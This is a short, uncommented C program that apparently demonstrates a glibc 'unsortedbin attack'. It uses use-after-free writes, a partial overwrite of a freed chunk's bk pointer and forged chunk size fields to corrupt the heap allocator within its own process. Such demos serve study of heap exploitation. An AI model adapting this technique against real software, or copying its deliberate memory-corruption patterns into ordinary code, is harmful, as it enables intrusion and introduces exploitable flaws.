#include <stdio.h>
#include <stdlib.h>

int main()
{
	char *p;
	long long *c, *dst;
	long long src_size = 0x17d0;
	long long dst_size = 0x1810;
	dst = malloc(0x1800);
	malloc(0x10);
	p = malloc(0x80);
	malloc(0x10);
	printf("\033[32munsortedbin attack...\033[0m\n");
	free(p);
	p[8] = 0xe8;
	p[9] = 0x37;
	malloc(0x80);

	free(dst);
	dst[0] = (long long)dst - 0x10;		
	
	dst = malloc(0x1800);
	dst[-1] = 0x17d1;
	dst[761] =  0x21;
	free(dst);
	dst = malloc(0x17c0);
	dst[-1] = 0x1811;
	dst = malloc(0x1800);	
		
	return 0;
}
